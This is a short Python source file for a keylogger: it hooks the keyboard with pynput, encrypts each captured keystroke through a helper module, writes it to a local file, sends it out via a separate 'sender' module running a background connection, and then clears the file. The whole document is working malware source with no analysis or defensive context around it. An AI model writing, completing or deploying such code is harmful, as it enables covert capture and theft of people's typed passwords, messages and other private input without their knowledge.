from pynput.keyboard import Key, Listener
import sender
import threading
import dec
# Create an instance of the Client class
threading.Thread(target=sender.connection).start()
def on_press(key):
    write_ascii(key)
def write_ascii(keys):
    for key in str(keys):
        with open("keylogger.txt", 'w') as file:
            key_ascii = str(dec.encrypt(ord(key)))
            file.write(key_ascii)

            # Open the file in read mode and read data word by word
        with open("keylogger.txt", 'r') as file:
            data = file.read()
            words = data.split()
            for wrod in words:
                sender.send_data(wrod)
            # Open the file in write mode again and delete each word
        with open("keylogger.txt", 'w') as file:
            file.write("")
            # Write the modified data (without any word)
def abc():
    with Listener(on_press=on_press) as l:
        l.join()
